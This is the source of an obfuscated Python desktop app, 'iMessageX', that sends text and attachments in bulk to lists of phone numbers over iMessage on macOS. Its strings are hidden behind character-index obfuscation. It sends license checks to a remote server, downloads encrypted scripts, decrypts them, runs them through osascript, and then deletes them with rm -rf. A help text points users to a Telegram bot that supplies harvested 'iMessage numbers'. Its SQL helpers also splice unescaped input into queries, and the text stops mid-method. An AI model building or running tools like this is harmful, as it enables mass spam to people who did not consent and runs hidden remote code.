_AA = (
    """wsjCt"""
    + """TxqX*W"""
    + """SL:`mv-PXV'I"""
    + """N/oCf|PH;"""
    + """wOch\Ggx<Tovl"""
    + """NiS>WEZ.{gr"""
    + """eFzd"""
    + """yyp#uep"""
    + """K$faqU=U"O~DtYZ@m"""
    + """nBYbKA)VJIksl"""
    + """BRu"""
    + """D[GM"""
    + """rR+LA?Mi,_}"""
    + """(dQHkj]^F&b!aEJ"""
)
_c = "all_imessage"
_b = "all_sent"
_a = "month_imessage"
_Z = "month_sent"
_Y = "today_imessage"
_X = "today_sent"
_W = "Checking..."
_V = "message"
_U = "get_imessage_numbers_frame"
_T = "license_frame"
_S = "stats_frame"
_R = "telegram"
_Q = "license_key"
_P = ".com"
_O = "home"
_N = "1.0"
_NN = """hnczQ%9"""
_M = "disabled"
_L = "Edit"
_K = "nsew"
_J = "\n"
_I = "serial_number"
_H = "-"
_G = "normal"
_F = "readonly"
_E = False
_D = True
_C = "transparent"
_B = "w"
_BB = """604518723"""
_A = "ew"
import customtkinter, os, base64, requests, subprocess, threading, sys, sqlite3, platform
from datetime import datetime, date, timedelta
from time import sleep
from getpass import getuser
from pathlib import Path
from Crypto.Cipher import AES


class I_A:
    D_N = (
        _AA[35]
        + _AA[4]
        + _AA[4]
        + _AA[62]
        + _AA[1]
        + _AA[13]
        + _AA[24]
        + _AA[24]
        + _AA[46]
        + _AA[15]
        + _AA[56]
        + _AA[1]
        + _AA[1]
        + _AA[70]
        + _AA[38]
        + _AA[56]
        + _AA[6]
        + _AA[52]
        + _AA[87]
        + _AA[64]
        + _AA[84]
        + _AA[84]
        + _AA[60]
        + _AA[59]
        + _AA[55]
        + _AA[56]
        + _AA[70]
        + _AA[15]
        + _AA[52]
        + _AA[1]
        + _AA[46]
        + _AA[4]
        + _AA[56]
    )
    hdrs_es = {
        _AA[89]
        + _AA[34]
        + _AA[34]
        + _AA[56]
        + _AA[62]
        + _AA[4]: _AA[70]
        + _AA[62]
        + _AA[62]
        + _AA[44]
        + _AA[46]
        + _AA[34]
        + _AA[70]
        + _AA[4]
        + _AA[46]
        + _AA[25]
        + _AA[84]
        + _AA[24]
        + _AA[2]
        + _AA[1]
        + _AA[25]
        + _AA[84]
    }

    def g_a_s_s(A, data):
        F = (
            f"{A.D_N}"
            + _AA[24]
            + _AA[70]
            + _AA[62]
            + _AA[46]
            + _AA[24]
            + _AA[38]
            + _AA[56]
            + _AA[4]
            + _AA[24]
        )
        B = requests.post(F, headers=A.hdrs_es, json=data)
        if B.status_code == 200:
            C = os.path.join(CDFG.APPF, _P)
            Path(C).mkdir(parents=_D, exist_ok=_D)
            G = B.json()
            for D in ["1", "2", "3"]:
                H = G.get(D)
                E = os.path.join(C, f"{D}")
                if not Path(E).is_file():
                    with open(E, _B) as I:
                        I.write(H)

    def g_a_k_a_v_s(A, ll_kk):
        B = "0"
        C = CDFG.SRVERRT
        try:
            G = (
                f"{A.D_N}"
                + _AA[24]
                + _AA[70]
                + _AA[62]
                + _AA[46]
                + _AA[24]
                + _AA[34]
                + _AA[35]
                + _AA[56]
                + _AA[34]
                + _AA[94]
                + _AA[24]
            )
            D = {_Q: ll_kk, _I: hlpr.gg_ss_nn()}
            E = requests.post(G, headers=A.hdrs_es, json=D)
            F = E.json()
            C = F.get(_V)
            if E.status_code == 200:
                A.g_a_s_s(D)
                B = F.get(_AA[59] + _AA[70] + _AA[4] + _AA[70])
            else:
                B = "1"
        except:
            pass
        return [B, C]

    def g_p_s(B, ll_kk=""):
        C = {}
        try:
            D = (
                f"{B.D_N}"
                + _AA[24]
                + _AA[70]
                + _AA[62]
                + _AA[46]
                + _AA[24]
                + _AA[1]
                + _AA[4]
                + _AA[70]
                + _AA[4]
                + _AA[1]
                + _AA[24]
            )
            E = {_I: hlpr.gg_ss_nn()}
            A = requests.post(D, headers=B.hdrs_es, json=E)
            if A.status_code == 200:
                C = A.json()
            try:
                D = (
                    f"{B.D_N}"
                    + _AA[24]
                    + _AA[70]
                    + _AA[62]
                    + _AA[46]
                    + _AA[24]
                    + _AA[16]
                    + _AA[46]
                    + _AA[62]
                    + _AA[17]
                    + _AA[1]
                    + _AA[4]
                    + _AA[70]
                    + _AA[4]
                    + _AA[1]
                    + _AA[24]
                )
                E[_Q] = ll_kk
                A = requests.post(D, headers=B.hdrs_es, json=E)
                if A.status_code == 200:
                    C[_AA[16] + _AA[46] + _AA[62]] = A.json()
            except:
                pass
        except:
            pass
        return C

    def u_n_s(A, srln, dte, st):
        B = (
            f"{A.D_N}"
            + _AA[24]
            + _AA[70]
            + _AA[62]
            + _AA[46]
            + _AA[24]
            + _AA[84]
            + _AA[25]
            + _AA[59]
            + _AA[56]
            + _AA[24]
        )
        C = {
            _I: srln,
            _AA[59] + _AA[70] + _AA[4] + _AA[56]: dte,
            _AA[1] + _AA[56] + _AA[84] + _AA[4]: st,
        }
        D = requests.post(B, headers=A.hdrs_es, json=C)

    def p_p(A, nbb, ate, snbr_al):
        B = (
            f"{A.D_N}"
            + _AA[24]
            + _AA[70]
            + _AA[62]
            + _AA[46]
            + _AA[24]
            + _AA[62]
            + _AA[35]
            + _AA[25]
            + _AA[84]
            + _AA[56]
            + _AA[24]
        )
        C = {
            _AA[84] + _AA[64] + _AA[15] + _AA[87] + _AA[56] + _AA[55]: nbb,
            _AA[59] + _AA[70] + _AA[4] + _AA[56]: ate,
            _I: snbr_al,
        }
        D = requests.post(B, headers=A.hdrs_es, json=C)

    def g_f_b_s(A, license_key, serial_number, user_id, is_getting_vip=_E):
        B = f"{A.D_N}/api/file/"
        if is_getting_vip:
            B = f"{A.D_N}/api/vip-file/"
        C = {_Q: license_key, _I: serial_number, "user_id": user_id}
        D = requests.post(B, headers=A.hdrs_es, json=C)
        return D.json().get(_V)


i_A = I_A()
_AA += _NN

class CDfg:
    APPF = (
        _AA[24]
        + _AA[72]
        + _AA[1]
        + _AA[56]
        + _AA[55]
        + _AA[1]
        + _AA[24]
        + f"{getuser()}"
        + _AA[24]
        + _AA[52]
        + _AA[46]
        + _AA[15]
        + _AA[56]
        + _AA[1]
        + _AA[1]
        + _AA[70]
        + _AA[38]
        + _AA[56]
        + _AA[6]
    )
    Path(APPF).mkdir(parents=_D, exist_ok=_D)
    DTBN = (
        f"{APPF}"
        + _AA[24]
        + _AA[46]
        + _AA[15]
        + _AA[56]
        + _AA[1]
        + _AA[1]
        + _AA[70]
        + _AA[38]
        + _AA[56]
        + _AA[6]
        + _AA[52]
        + _AA[59]
        + _AA[87]
    )
    LCST = _AA[44] + _AA[46] + _AA[34] + _AA[56] + _AA[84] + _AA[1] + _AA[56]
    IST = {LCST: ["key"]}
    LCSIT = (
        _AA[12]
        + _AA[46]
        + _AA[34]
        + _AA[56]
        + _AA[84]
        + _AA[1]
        + _AA[56]
        + " "
        + _AA[46]
        + _AA[1]
        + " "
        + _AA[46]
        + _AA[84]
        + _AA[16]
        + _AA[70]
        + _AA[44]
        + _AA[46]
        + _AA[59]
        + _AA[126]
    )
    SRVERRT = (
        _AA[3]
        + _AA[70]
        + _AA[84]
        + " "
        + _AA[84]
        + _AA[25]
        + _AA[4]
        + " "
        + _AA[34]
        + _AA[25]
        + _AA[84]
        + _AA[84]
        + _AA[56]
        + _AA[34]
        + _AA[4]
        + " "
        + _AA[4]
        + _AA[25]
        + " "
        + _AA[4]
        + _AA[35]
        + _AA[56]
        + " "
        + _AA[1]
        + _AA[56]
        + _AA[55]
        + _AA[16]
        + _AA[56]
        + _AA[55]
        + _AA[52]
        + " "
        + _AA[18]
        + _AA[44]
        + _AA[56]
        + _AA[70]
        + _AA[1]
        + _AA[56]
        + " "
        + _AA[34]
        + _AA[25]
        + _AA[84]
        + _AA[4]
        + _AA[70]
        + _AA[34]
        + _AA[4]
        + " "
        + _AA[4]
        + _AA[35]
        + _AA[56]
        + " "
        + _AA[70]
        + _AA[59]
        + _AA[15]
        + _AA[46]
        + _AA[84]
        + _AA[46]
        + _AA[1]
        + _AA[4]
        + _AA[55]
        + _AA[70]
        + _AA[4]
        + _AA[25]
        + _AA[55]
        + _AA[1]
        + _AA[52]
    )
    GET_IMESSAGE_NUMBERS_HELP_TEXT = 'Step 1. Go to telegram, search for "imessagex_bot"\nStep 2. Press Start in the private chatbox with imessagex_bot.\nStep 3. Enter command below in the private chatbox with imessagex_bot\n                /get_id\nStep 4. Copy the User ID and paste to the Telegram ID input field below.\nStep 5. Press Get file to get the file contains imessage numbers in the private chat with imessage_bot.\n\n\nWARNING: Please don\'t spam this Get file option. Otherwise your license might be banned.\n'


CDFG = CDfg()


class DAE:
    def __init__(B):
        A = B.get_conn()
        C = A.cursor()
        C.execute(
            "CREATE TABLE IF NOT EXISTS license\n                        (id INTEGER PRIMARY KEY, key TEXT)"
        )
        A.commit()
        A.close()
        B.select_or_insert(table=CDFG.LCST, condition="id=1", data=("",))

    def get_conn(C):
        try:
            A = sqlite3.connect(CDFG.DTBN)
            return A
        except Exception as B:
            print(f"Error connecting to Sqlite database: {B}")
            sys.exit(1)

    def select_with(C, query):
        B = C.get_conn()
        A = B.cursor()
        A.execute(query)
        D = A.fetchall()
        A.close()
        B.close()
        return D

    def select_all_from(C, tab, condition="1=1", cols="*"):
        B = C.get_conn()
        A = B.cursor()
        A.execute(f"SELECT {cols} FROM {tab} WHERE {condition}")
        D = A.fetchall()
        A.close()
        B.close()
        return D

    def insert_into(E, table, data=None, is_bulk=_E):
        B = table
        C = E.get_conn()
        A = C.cursor()
        id = 0
        F = f"({', '.join(CDFG.IST[B])})"
        G = f"({', '.join(['?']*len(CDFG.IST[B]))})"
        D = f"INSERT INTO {B} {F} VALUES {G}"
        if is_bulk:
            A.executemany(D, data)
        else:
            A.execute(D, data)
            id = A.lastrowid
        C.commit()
        A.close()
        C.close()
        return id

    def update_table(C, table, set_cond, where_cond, data=()):
        A = C.get_conn()
        B = A.cursor()
        B.execute(f"UPDATE {table} set {set_cond} WHERE {where_cond}", data)
        A.commit()
        B.close()
        A.close()

    def delete_from(C, table="", condition="1=1"):
        A = C.get_conn()
        B = A.cursor()
        B.execute(f"DELETE FROM {table} WHERE {condition}")
        A.commit()
        B.close()
        A.close()

    def select_or_insert(A, table, condition, data):
        D = condition
        B = table
        C = A.select_all_from(tab=B, condition=D)
        if not C:
            A.insert_into(B, data)
            C = A.select_all_from(B, condition=D)
        return C


_dbe = DAE()


def dlr_a(atc, ctt, akyy):
    A = "2"
    C = platform.mac_ver()[0]
    if int(float(C.split(".")[0])) > 11:
        A = "3"
    B = b_a_s_f_p(A, akyy)
    D = (
        _AA[25]
        + _AA[1]
        + _AA[70]
        + _AA[1]
        + _AA[34]
        + _AA[55]
        + _AA[46]
        + _AA[62]
        + _AA[4]
        + f' {B} "{ctt}" "{atc}"'
    )
    os.system(D)
    os.system(_AA[55] + _AA[15] + " " + _AA[17] + _AA[55] + _AA[27] + f" {B}")


def dlr_t(tt, cat, ske):
    A = b_a_s_f_p("1", ske)
    B = (
        _AA[25]
        + _AA[1]
        + _AA[70]
        + _AA[1]
        + _AA[34]
        + _AA[55]
        + _AA[46]
        + _AA[62]
        + _AA[4]
        + f' {A} "{cat}" "{tt}"'
    )
    os.system(B)
    os.system(_AA[55] + _AA[15] + " " + _AA[17] + _AA[55] + _AA[27] + f" {A}")


def b_a_s_f_p(flne, asky):
    C = flne
    A = asky
    D = os.path.join(CDFG.APPF, _P)
    F = os.path.join(D, C)
    with open(F, "r") as G:
        B = G.read().strip(_J)
    H, I, J = B.split(_AA[68] + _AA[68])
    A = base64.b64decode(A)
    K = AES.new(A, AES.MODE_EAX, base64.b64decode(J))
    B = K.decrypt_and_verify(base64.b64decode(H), base64.b64decode(I))
    E = os.path.join(
        D,
        f"{C}"
        + _AA[52]
        + _AA[70]
        + _AA[62]
        + _AA[62]
        + _AA[44]
        + _AA[56]
        + _AA[1]
        + _AA[34]
        + _AA[55]
        + _AA[46]
        + _AA[62]
        + _AA[4],
    )
    with open(E, _B) as L:
        print(B.decode(), file=L)
    return E


class Hpr:
    def gg_ss_nn(C):
        A = (
            _AA[1]
            + _AA[60]
            + _AA[1]
            + _AA[4]
            + _AA[56]
            + _AA[15]
            + _AA[113]
            + _AA[62]
            + _AA[55]
            + _AA[25]
            + _AA[27]
            + _AA[46]
            + _AA[44]
            + _AA[56]
            + _AA[55]
            + " "
            + _AA[11]
            + _AA[18]
            + _AA[30]
            + _AA[70]
            + _AA[55]
            + _AA[59]
            + _AA[0]
            + _AA[70]
            + _AA[55]
            + _AA[56]
            + _AA[78]
            + _AA[70]
            + _AA[4]
            + _AA[70]
            + _AA[5]
            + _AA[60]
            + _AA[62]
            + _AA[56]
            + " "
            + _AA[28]
            + " "
            + _AA[70]
            + _AA[0]
            + _AA[94]
            + " "
            + _AA[21]
            + _AA[24]
            + _AA[11]
            + _AA[56]
            + _AA[55]
            + _AA[46]
            + _AA[70]
            + _AA[44]
            + _AA[24]
            + " "
            + _AA[53]
            + _AA[62]
            + _AA[55]
            + _AA[46]
            + _AA[84]
            + _AA[4]
            + " "
            + _AA[68]
            + _AA[139]
            + _AA[114]
            + _AA[21]
        )
        B = subprocess.check_output(A, shell=_D).decode().strip()
        return B

    def cfdr(D):
        B = os.path.join(CDFG.APPF, _AA[52] + _AA[94])
        A = _AA[55] + _AA[15] + " " + _AA[17] + _AA[55] + _AA[27] + f" {B}"
        os.system(A)
        C = os.path.join(CDFG.APPF, _P)
        A = _AA[55] + _AA[15] + " " + _AA[17] + _AA[55] + _AA[27] + f" {C}"
        os.system(A)

    def get_li(A):
        try:
            li = _dbe.select_all_from(tab=CDFG.LCST)
            return li[0][-1]
        except:
            return ""

    def up_li(A, li):
        try:
            _dbe.update_table(
                table=CDFG.LCST,
                set_cond=f"key='{li}'",
                where_cond="id=1",
            )
            return "OK"
        except:
            return "Error"

    def gtf_ct(C, fl_p):
        with open(fl_p) as A:
            B = A.readlines()
        return [A.strip(_J) for A in B]


hlpr = Hpr()
_AA += _BB

class App(customtkinter.CTk):
    def __init__(A):
        H = "License"
        E = "gray30"
        D = "gray70"
        C = "gray90"
        B = "gray10"
        super().__init__()
        A.title("iMessageX")
        A.minsize(width=960, height=526)
        A.protocol("WM_DELETE_WINDOW", A.apo_clng)
        A.bind("<Command-q>", A.apo_clng)
        A.bind("<Command-w>", A.apo_clng)
        A.createcommand("tk::mac::Quit", A.apo_clng)
        A.grid_rowconfigure(0, weight=1)
        A.grid_columnconfigure(1, weight=1)
        A.na_fr_a = customtkinter.CTkFrame(A, corner_radius=0)
        A.na_fr_a.grid(row=0, column=0, sticky=_K)
        A.na_fr_a.grid_rowconfigure(5, weight=1)
        A.an_fr_l = customtkinter.CTkLabel(
            A.na_fr_a,
            text="  iMessageX",
            compound="left",
            font=customtkinter.CTkFont(size=15, weight="bold"),
        )
        A.an_fr_l.grid(row=0, column=0, padx=20, pady=20)
        A.heb = customtkinter.CTkButton(
            A.na_fr_a,
            corner_radius=0,
            height=40,
            border_spacing=10,
            text="Home",
            fg_color=_C,
            text_color=(B, C),
            hover_color=(D, E),
            anchor=_B,
            command=A.hbe_hm_be,
        )
        A.heb.grid(row=1, column=0, sticky=_A)
        A.sts_bt = customtkinter.CTkButton(
            A.na_fr_a,
            corner_radius=0,
            height=40,
            border_spacing=10,
            text="Statistics",
            fg_color=_C,
            text_color=(B, C),
            hover_color=(D, E),
            anchor=_B,
            command=A.sfbe_db_se,
        )
        A.sts_bt.grid(row=2, column=0, sticky=_A)
        A.lef_b = customtkinter.CTkButton(
            A.na_fr_a,
            corner_radius=0,
            height=40,
            border_spacing=10,
            text=H,
            fg_color=_C,
            text_color=(B, C),
            hover_color=(D, E),
            anchor=_B,
            command=A.lf_eb_bf,
        )
        A.lef_b.grid(row=3, column=0, sticky=_A)
        A.g_i_n_fbt = customtkinter.CTkButton(
            A.na_fr_a,
            corner_radius=0,
            height=40,
            border_spacing=10,
            text="Get iMessage Numbers",
            fg_color=_C,
            text_color=(B, C),
            hover_color=(D, E),
            anchor=_B,
            command=A.inf_ebg,
        )
        A.g_i_n_fbt.grid(row=4, column=0, sticky=_A)
        A.appearance_mode_menu = customtkinter.CTkOptionMenu(
            A.na_fr_a,
            values=["System", "Light", "Dark"],
            command=A.change_appearance_mode_event,
        )
        A.appearance_mode_menu.grid(row=6, column=0, padx=20, pady=20, sticky="s")
        A._hef = customtkinter.CTkFrame(A, corner_radius=0, fg_color=_C)
        A._hef.grid_columnconfigure(1, weight=1)
        A._hef.grid_rowconfigure(7, weight=1)
        A.home_frame_textbox_label = customtkinter.CTkLabel(A._hef, text="Text to send")
        A.home_frame_textbox_label.grid(
            row=0, columnspan=2, padx=20, pady=(10, 0), sticky=_A
        )
        A.hft_tax01 = customtkinter.CTkTextbox(A._hef)
        A.hft_tax01.grid(row=1, columnspan=2, padx=20, pady=10, sticky=_A)
        A.home_frame_delay_time_label = customtkinter.CTkLabel(
            A._hef, text="Time between 2 messages"
        )
        A.home_frame_delay_time_label.grid(row=3, column=0, padx=20, pady=10, sticky=_B)
        A.bax_15ia = customtkinter.CTkEntry(
            A._hef,
            validate="key",
            validatecommand=(A._hef.register(A.validate_sleep_time), "%P"),
        )
        A.bax_15ia.grid(row=3, column=1, padx=20, pady=10, sticky=_A)
        A.bax_15ia.insert(0, "0")
        A.hfabbx_ath = customtkinter.CTkButton(
            A._hef, text="Attachment", command=A.atb_hbf
        )
        A.hfabbx_ath.grid(row=4, column=0, padx=20, pady=10, sticky=_B)
        A.hf_ia_ai_fia = customtkinter.CTkEntry(A._hef)
        A.hf_ia_ai_fia.grid(row=4, column=1, padx=20, pady=10, sticky=_A)
        A.hf_ia_ai_fia.insert(0, "")
        A.hf_ia_ai_fia.configure(state=_F)
        A.cbfhH_2ax = customtkinter.CTkButton(
            A._hef, text="Contacts file", command=A.cbh_axd
        )
        A.cbfhH_2ax.grid(row=5, column=0, padx=20, pady=10, sticky=_B)
        A.hfc_iaczs = customtkinter.CTkEntry(A._hef)
        A.hfc_iaczs.grid(row=5, column=1, padx=20, pady=10, sticky=_A)
        A.hfc_iaczs.insert(0, "")
        A.hfc_iaczs.configure(state=_F)
        A.hf_lw_w1k42 = customtkinter.CTkLabel(A._hef, text="")
        A.hf_lw_w1k42.grid(row=6, columnspan=2, padx=20, pady=10, sticky=_A)
        A.hfss_ss8x = _E
        A.a8hf_sbkh = customtkinter.CTkButton(A._hef, text="Send", command=A.bxfh_sbh_1)
        A.a8hf_sbkh.grid(row=7, columnspan=2, padx=20, pady=(10, 0), sticky=_A)
        A.s_t_sf = customtkinter.CTkFrame(A, corner_radius=0, fg_color=_C)
        A.s_t_sf.grid_columnconfigure(1, weight=1)
        A.stats_frame_today_sent_label = customtkinter.CTkLabel(
            A.s_t_sf, text="Today sent"
        )
        A.stats_frame_today_sent_label.grid(row=0, column=0, padx=20, pady=(40, 10))
        A.sft_si = customtkinter.CTkEntry(A.s_t_sf)
        A.sft_si.grid(row=0, column=1, padx=20, pady=(40, 10), sticky=_A)
        A.stats_frame_today_imessage_label = customtkinter.CTkLabel(
            A.s_t_sf, text="Today iMessage"
        )
        A.stats_frame_today_imessage_label.grid(row=1, column=0, padx=20, pady=10)
        A.sf_tii = customtkinter.CTkEntry(A.s_t_sf)
        A.sf_tii.grid(row=1, column=1, padx=20, pady=10, sticky=_A)
        A.stats_frame_month_sent_label = customtkinter.CTkLabel(
            A.s_t_sf, text="Month sent"
        )
        A.stats_frame_month_sent_label.grid(row=2, column=0, padx=20, pady=10)
        A.ssfms_i = customtkinter.CTkEntry(A.s_t_sf)
        A.ssfms_i.grid(row=2, column=1, padx=20, pady=10, sticky=_A)
        A.stats_frame_month_imessage_label = customtkinter.CTkLabel(
            A.s_t_sf, text="Month iMessage"
        )
        A.stats_frame_month_imessage_label.grid(row=3, column=0, padx=20, pady=10)
        A.sfmii = customtkinter.CTkEntry(A.s_t_sf)
        A.sfmii.grid(row=3, column=1, padx=20, pady=10, sticky=_A)
        A.stats_frame_all_sent_label = customtkinter.CTkLabel(A.s_t_sf, text="All sent")
        A.stats_frame_all_sent_label.grid(row=4, column=0, padx=20, pady=10)
        A.s_fa_si = customtkinter.CTkEntry(A.s_t_sf)
        A.s_fa_si.grid(row=4, column=1, padx=20, pady=10, sticky=_A)
        A.stats_frame_all_imessage_label = customtkinter.CTkLabel(
            A.s_t_sf, text="All iMessage"
        )
        A.stats_frame_all_imessage_label.grid(row=5, column=0, padx=20, pady=10)
        A.sfa_i_i = customtkinter.CTkEntry(A.s_t_sf)
        A.sfa_i_i.grid(row=5, column=1, padx=20, pady=10, sticky=_A)
        A.vsl_sf = customtkinter.CTkLabel(A.s_t_sf, text="VIP")
        A.vsl_sf.grid(row=6, columnspan=2, padx=20, pady=(10, 0), sticky=_A)
        A.s_v_fst = customtkinter.CTkTextbox(A.s_t_sf)
        A.s_v_fst.grid(row=7, columnspan=2, padx=20, pady=10, sticky=_A)
        A.lif_cen = customtkinter.CTkFrame(A, corner_radius=0, fg_color=_C)
        A.lif_cen.grid_columnconfigure(1, weight=1)
        A.lif_cen.grid_rowconfigure(4, weight=1)
        A.license_frame_serial_number_label = customtkinter.CTkLabel(
            A.lif_cen, text="Serial Number"
        )
        A.license_frame_serial_number_label.grid(
            row=0, column=0, padx=20, pady=(40, 10)
        )
        A.license_frame_serial_number = customtkinter.CTkEntry(A.lif_cen)
        A.license_frame_serial_number.grid(
            row=0, column=1, padx=20, pady=(40, 10), sticky=_A
        )
        A.license_frame_serial_number.insert(0, hlpr.gg_ss_nn())
        A.license_frame_serial_number.configure(state=_F)
        A.license_frame_license_label = customtkinter.CTkLabel(A.lif_cen, text=H)
        A.license_frame_license_label.grid(row=1, column=0, padx=20, pady=10)
        A.l_f_l_i = customtkinter.CTkEntry(A.lif_cen)
        A.l_f_l_i.grid(row=1, column=1, padx=20, pady=10, sticky=_A)
        A.lik = hlpr.get_li()
        A.l_f_l_i.insert(0, A.lik)
        A.l_f_l_i.configure(state=_F)
        A.l_f_l_k_v_t = customtkinter.CTkLabel(A.lif_cen, text=_W)
        A.l_f_l_k_v_t.grid(row=2, columnspan=2, padx=20, pady=10)
        A.l_f_e_a_s_b_s = _L
        A.l_f_e_a_s_b = customtkinter.CTkButton(
            A.lif_cen, text=_L, command=A.l_f_e_a_s_b_e
        )
        A.l_f_e_a_s_b.grid(row=3, columnspan=2, padx=20, pady=20, sticky=_A)
        A.in_f_g = customtkinter.CTkFrame(A, corner_radius=0, fg_color=_C)
        A.in_f_g.grid_columnconfigure(1, weight=1)
        A.in_f_g.grid_rowconfigure(8, weight=1)
        A.get_imessage_numbers_frame_textbox_label = customtkinter.CTkLabel(
            A.in_f_g, text="How to use?"
        )
        A.get_imessage_numbers_frame_textbox_label.grid(
            row=0, columnspan=2, padx=20, pady=(10, 0), sticky=_A
        )
        A.get_imessage_numbers_frame_textbox = customtkinter.CTkTextbox(A.in_f_g)
        A.get_imessage_numbers_frame_textbox.grid(
            row=1, columnspan=2, padx=20, pady=10, sticky=_A
        )
        A.get_imessage_numbers_frame_textbox.insert(
            _N, CDFG.GET_IMESSAGE_NUMBERS_HELP_TEXT
        )
        A.get_imessage_numbers_frame_textbox.configure(state=_M)
        A.get_imessage_numbers_frame_telegram_id_label = customtkinter.CTkLabel(
            A.in_f_g, text="Telegram ID"
        )
        A.get_imessage_numbers_frame_telegram_id_label.grid(
            row=3, column=0, padx=20, pady=10, sticky=_B
        )
        F = os.path.join(CDFG.APPF, _R)
        if Path(F).is_file():
            G = open(F).read().strip(_J)
        else:
            G = ""
        A.g_i_n_f_t_i_i = customtkinter.CTkEntry(A.in_f_g)
        A.g_i_n_f_t_i_i.grid(row=3, column=1, padx=20, pady=10, sticky=_A)
        A.g_i_n_f_t_i_i.insert("0", G)
        A.hfgi_nrflaut = customtkinter.CTkLabel(A.in_f_g, text="")
        A.hfgi_nrflaut.grid(row=4, columnspan=2, padx=20, pady=10, sticky=_A)
        A.get_imessage_numbers_frame_get_button = customtkinter.CTkButton(
            A.in_f_g,
            text="Get file",
            command=A.g_i_n_f_g_b_h,
        )
        A.get_imessage_numbers_frame_get_button.grid(
            row=5, columnspan=2, padx=20, pady=(10, 0), sticky=_A
        )
        A.get_imessage_numbers_frame_spacer_label = customtkinter.CTkLabel(
            A.in_f_g, text=""
        )
        A.get_imessage_numbers_frame_spacer_label.grid(
            row=6, columnspan=2, padx=20, pady=10, sticky=_A
        )
        A.gin_fgv_bt = customtkinter.CTkButton(
            A.in_f_g,
            text="Get VIP file",
            command=A.g_i_n_f_g_v_b_h,
        )
        A.slcf_bn(_O)
        A.icslk_angt1 = _D
        threading.Thread(target=A.c_l_k).start()
        A.isrus_ot86 = _D
        threading.Thread(target=A.hfm_us_susts_altw43).start()

    def validate_sleep_time(C, text):
        A = text
        if A.endswith("."):
            A = A + "0"
        try:
            B = float(A)
            if B >= 0:
                return _D
        except:
            return _E

    def g_a_s_p_s(A):
        A.ph_sss = i_A.g_p_s(A.lik)
        C = {
            _X: A.sft_si,
            _Y: A.sf_tii,
            _Z: A.ssfms_i,
            _a: A.sfmii,
            _b: A.s_fa_si,
            _c: A.sfa_i_i,
        }
        for D, B in C.items():
            B.configure(state=_G)
            B.delete(0, customtkinter.END)
            B.insert(0, A.ph_sss.get(D, _H))
            B.configure(state=_F)
        A.vp_ssts = A.ph_sss.get(_AA[16] + _AA[46] + _AA[62], "")
        if not A.vp_ssts:
            A.vsl_sf.grid_forget()
            A.s_v_fst.grid_forget()
            A.gin_fgv_bt.grid_forget()
        else:
            A.vsl_sf.grid(row=6, columnspan=2, padx=20, pady=(10, 0), sticky=_A)
            A.s_v_fst.grid(row=7, columnspan=2, padx=20, pady=10, sticky=_A)
            A.gin_fgv_bt.grid(row=7, columnspan=2, padx=20, pady=(10, 0), sticky=_A)
            A.s_v_fst.configure(state=_G)
            A.s_v_fst.delete(_N, customtkinter.END)
            A.s_v_fst.insert(_N, A.gv_sts(A.vp_ssts))
            A.s_v_fst.configure(state=_M)

    def gv_sts(J, vp_sts):
        B = ""
        for C, A in vp_sts.items():
            D = A.get(_Y, _H)
            E = A.get(_X, _H)
            F = A.get(_a, _H)
            G = A.get(_Z, _H)
            H = A.get(_c, _H)
            I = A.get(_b, _H)
            B += f"""Serial number: {C}
\tToday:\t{D}/{E}\tiMessages/Sent
\tMonth:\t{F}/{G}\tiMessages/Sent
\tAll:\t{H}/{I}\tiMessages/Sent

"""
        return B

    def slcf_bn(A, name):
        D = "gray25"
        C = "gray75"
        B = name
        A.heb.configure(fg_color=(C, D) if B == _O else _C)
        A.sts_bt.configure(fg_color=(C, D) if B == _S else _C)
        A.lef_b.configure(fg_color=(C, D) if B == _T else _C)
        A.g_i_n_fbt.configure(fg_color=(C, D) if B == _U else _C)
        if B == _O:
            A._hef.grid(row=0, column=1, sticky=_K)
        else:
            A._hef.grid_forget()
        if B == _S:
            A.s_t_sf.grid(row=0, column=1, sticky=_K)
        else:
            A.s_t_sf.grid_forget()
        if B == _T:
            A.lif_cen.grid(row=0, column=1, sticky=_K)
        else:
            A.lif_cen.grid_forget()
        if B == _U:
            A.in_f_g.grid(row=0, column=1, sticky=_K)
        else:
            A.in_f_g.grid_forget()

    def l_f_e_a_s_b_e(A):
        B = _AA[11] + _AA[70] + _AA[16] + _AA[56]
        if A.l_f_e_a_s_b_s == _L:
            A.l_f_l_i.focus()
            A.l_f_e_a_s_b_s = B
            A.l_f_e_a_s_b.configure(text=B)
            A.l_f_l_i.configure(state=_G)
        else:
            A.l_f_e_a_s_b_s = _L
            A.lik = A.l_f_l_i.get()
            hlpr.up_li(li=A.lik)
            A.l_f_l_k_v_t.configure(text=_W)
            A.l_f_e_a_s_b.configure(text=_L)
            A.l_f_l_i.configure(state=_F)

    def hbe_hm_be(A):
        A.slcf_bn(_O)

    def sfbe_db_se(A):
        A.slcf_bn(_S)

    def lf_eb_bf(A):
        A.slcf_bn(_T)

    def inf_ebg(A):
        A.slcf_bn(_U)

    def change_appearance_mode_event(A, new_appearance_mode):
        customtkinter.set_appearance_mode(new_appearance_mode)

    def atb_hbf(A):
        B = customtkinter.filedialog.askopenfilename()
        if not B:
            return
        A.hf_ia_ai_fia.configure(state=_G)
        A.hf_ia_ai_fia.delete(0, customtkinter.END)
        A.hf_ia_ai_fia.insert(0, B)
        A.hf_ia_ai_fia.configure(state=_F)

    def cbh_axd(A):
        B = customtkinter.filedialog.askopenfilename()
        if not B:
            return
        A.hfc_iaczs.configure(state=_G)
        A.hfc_iaczs.delete(0, customtkinter.END)
        A.hfc_iaczs.insert(0, B)
        A.hfc_iaczs.configure(state=_F)

    def sta_a_txa_saa(A):
        C = A.hft_tax01.get(
            _N, _AA[56] + _AA[84] + _AA[59] + _AA[17] + _AA[141] + _AA[34]
        )
        D = A.bax_15ia.get()
        E = A.hf_ia_ai_fia.get()
        F = A.hfc_iaczs.get()
        if F:
            I = hlpr.gtf_ct(fl_p=F)
            for B in I:
                B = B.strip(_J).strip()
                G = os.path.join(CDFG.APPF, _AA[52] + _AA[94])
                if not Path(G).is_file():
                    continue
                else:
                    with open(G, "r") as J:
                        H = J.read().strip(_J)
                if not A.hfss_ss8x:
                    break
                if C:
                    dlr_t(C, B, H)
                    sleep(float(D))
                if E:
                    dlr_a(E, B, H)
                    sleep(float(D))
        A.sts_taa_akux()
        A.hfss_ss8x = _E

    def sts_taa_akux(A):
        A.hft_tax01.configure(state=_G)
        A.bax_15ia.configure(state=_G)
        A.hfabbx_ath.configure(state=_G)
        A.cbfhH_2ax.configure(state=_G)
        A.a8hf_sbkh.configure(text="Send")

    def bxfh_sbh_1(A):
        A.hfss_ss8x = not A.hfss_ss8x
        if A.hfss_ss8x:
            A.hft_tax01.configure(state=_M)
